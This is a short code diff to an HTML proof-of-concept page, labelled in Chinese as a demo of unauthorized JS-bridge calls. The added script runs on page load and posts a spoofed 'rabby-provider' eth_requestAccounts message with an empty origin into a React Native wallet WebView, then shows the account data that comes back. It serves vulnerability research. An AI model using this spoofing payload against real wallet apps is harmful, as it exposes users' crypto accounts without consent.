@@ -2,19 +2,27 @@
 <html lang="en">
     <head>
         <meta charset="UTF-8" />
-        <title>JSB安全问题</title>
+        <title>Spoof Relay - poc2: 200</title>
     </head>
     <body>
         <h2>越权调用JSB演示</h2>
         <p id="msg">==== 信息记录 ====</p>
         <button id="connectBtn">调用requestAccounts</button>
         <script>
+            ReactNativeWebView.postMessage(
+                '{"name":"rabby-provider","data":{"method":"eth_requestAccounts","jsonrpc":"2.0","id":307038727,"toNative":true},"origin":""}'
+            );
+            document.getElementById("msg").innerText +=
+                "\n自动调用requestAccounts\n";
             window.addEventListener("message", (event) => {
                 const data = event.data;
                 if (data.data != null && data.data.id === 307038727) {
-                    document.getElementById("msg").innerText += `\nrequestAccounts调用结果: ${JSON.stringify(data)}`;
+                    document.getElementById(
+                        "msg"
+                    ).innerText += `\nrequestAccounts调用结果: ${JSON.stringify(
+                        data
+                    )}`;
                 }
-                document.getElementById("msg").innerText += `\n收到消息: ${data}`;
             });
 
             document
